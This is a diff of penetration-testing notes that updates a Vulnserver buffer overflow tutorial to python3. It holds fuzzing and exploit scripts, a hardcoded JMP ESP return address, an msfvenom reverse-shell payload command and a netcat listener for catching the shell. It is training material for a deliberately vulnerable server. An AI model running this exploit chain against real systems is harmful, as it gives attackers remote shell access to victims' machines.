@@ -3119,7 +3119,6 @@ HTTP POST Attack
   - Example of usage: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
 
 **Issues**
-- For the following scripts, use python2 instead of python3
 - ["Problems attach Immunity to Vulnserver on Windows 10"](https://www.reddit.com/r/hacking/comments/ohg5t0/problems_attach_immunity_to_vulnserver_on_windows/): `Don't start vulnserver, start Immunity as Admin, File > Open > vulnserver.exe, push "play"`.
 
 **Steps to conduct a Buffer Overflow**
@@ -3145,7 +3144,7 @@ s_string_variable("0");
 #### <ins>Fuzzing</ins>
 
 ```python
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 from time import sleep
 
@@ -3155,13 +3154,13 @@ while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('<IP Vulnserver>', <port vulnserver>))
-        s.send(('TRUN /.:/' + buffer))
+        s.send(('TRUN /.:/' + buffer).encode())
         
         s.close()
         sleep(1)
         buffer += "A" * 100
     except:
-        print "Fuzzing crashed at %s bytes" % str(len(buffer))
+        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
         sys.exit()
 ```
 
@@ -3170,7 +3169,7 @@ while True:
 1. Get the result from: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes_where_server_crashed>`
 2. Modify the previous script in
    ```python
-   #!/usr/bin/python
+   #!/usr/bin/python3
    import sys, socket
    from time import sleep
    
@@ -3180,10 +3179,10 @@ while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('<IP Vulnserver>', <port vulnserver>))
-           s.send(('TRUN /.:/' + offset))
+           s.send(('TRUN /.:/' + offset).encode())
            s.close()
        except:
-           print "Error connecting to the server"
+           print ("Error connecting to the server")
            sys.exit()
    ```
 3. After running the script, read the value from the EIP
@@ -3194,7 +3193,7 @@ while True:
 From the previous result, we should get the position `2003` for the start of the EIP. We can test this by sending `A * 2003` plus `B * 4` and see if `EIP = 42424242` (since `42424242` = `BBBB`).
 
 ```python
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 from time import sleep
 
@@ -3204,33 +3203,21 @@ while True:
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('<IP Vulnserver>', <port vulnserver>))
-		s.send(('TRUN /.:/' + shellcode))
+		s.send(('TRUN /.:/' + shellcode).encode())
 		s.close()
 	except:
-		print "Error connecting to the server"
+		print ("Error connecting to the server")
 		sys.exit()
 ```
 
 #### <ins>Finding bad characters</ins>
 
-**Bad characters**
 ```python
-badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
-"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
-"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
-"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
-"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
-"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
-"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-```
-
-```python
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 from time import sleep
 
-badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
 "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
 "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
@@ -3257,9 +3244,17 @@ while True:
    - Example: you may get a result like `... 01 02 03 B0 B0 06 07 08 ...`. As you can see, `04` and `05` are missing, so you've found a bad character.
 3. Write down every character missing
 
+Another solution to the step `3.`, with mona and Immunity Debugger
+1. Set the working directory with `!mona config -set workingfolder c:\mona`
+2. Generate bad characters with `!mona bytearray -cpb "\x00"` from Immunity Debugger
+   -  Notice the new files in `c:\mona`
+3. Run the python script of this section
+4. Execute the command `!mona compare -f c:\mona\bytearray.bin -a <address of ESP>`
+- Note: this may cause false positive
+
 #### <ins>Finding the right module</ins>
 
-Note: `JMP ESP` will be used as the pointer to jump to the shellcode. With `nasm_shell.rb` with can get the hex equivalent to these commands.
+Note: `JMP ESP` will be used as the pointer to jump to the shellcode. With `nasm_shell.rb` we can get the hex equivalent to these commands.
 ```
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm > JMP ESP
@@ -3268,52 +3263,36 @@ nasm > JMP ESP
 
 On Immunity, using mona, type
 1. `!mona modules` to get the module to use, one with no memory protection for vulneserver. In this case, `essfunc.dll`.
-2. `!mona find -s "\xff\xe4" -m essfunc.dll`.
-3. Look at `[+] Results:` the return addresses and select the first address with no memory protection, in this case `625011af`.
-4. Use now the following python script with python2. Notice how the address `625011af` is in reverse in `shellcode`
-   ```python
-   #!/usr/bin/python
-   import sys, socket
-   from time import sleep
-   
-   shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
-   
-   while True:
-   	try:
-   		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   		s.connect(('<IP Vulnserver>', <port vulnserver>))
-   		s.send('TRUN /.:/' + shellcode)
-   		s.close()
-   	except:
-   		print "Error connecting to the server"
-   		sys.exit()
-   ```
-   - Before launching the script, in Immunify click on `Enter expression to follow` > insert `625011af` > Click on it > press `F2` to inser a breakpoint
+2. `!mona jmp -r ESP -m "essfunc.dll"` to find the jump address
+3. See "[+] Results:"
 
 #### <ins>Generating Shellcode</ins>
 
 1. Copy the result from `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
    - Always note the payload size
-2. See the following script (use python2). Note: `shellcode` also contains `"\x90" * 32`. Those are NOPs, some padding to make sure that our code gets executed.
+2. See the following script
    ```python
-   #!/usr/bin/python
+   #!/usr/bin/python3
    import sys, socket
    from time import sleep
    
-   overflow = (HERE INSERT THE RESULT FROM THE STEP 1, THE VALUE IN unsigned char buf[])
+   overflow = () # HERE INSERT THE RESULT FROM THE STEP 1, THE VALUE IN `unsigned char buf[]`
+                 # Before every line insert `b`, this will say to bytencode the string
    
-   shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
+   shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow
    
    while True:
    	try:
    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		s.connect(('<IP Vulnserver>', <port vulnserver>))
-   		s.send('TRUN /.:/' + shellcode)
+   		s.send((b'TRUN /.:/' + shellcode))
    		s.close()
    	except:
-   		print "Error connecting to the server"
+   		print ("Error connecting to the server")
    		sys.exit()
    ```
+   - "\xaf\x11\x50\x62" is the jump address found for this example `625011af` in reverse
+   - `shellcode` also contains `"\x90" * 32`. Those are NOPs, some padding to make sure that our code gets executed.
 3. Use the command `nc -nvlp 4444`
 4. Run the script, notice the shell in netcat
 
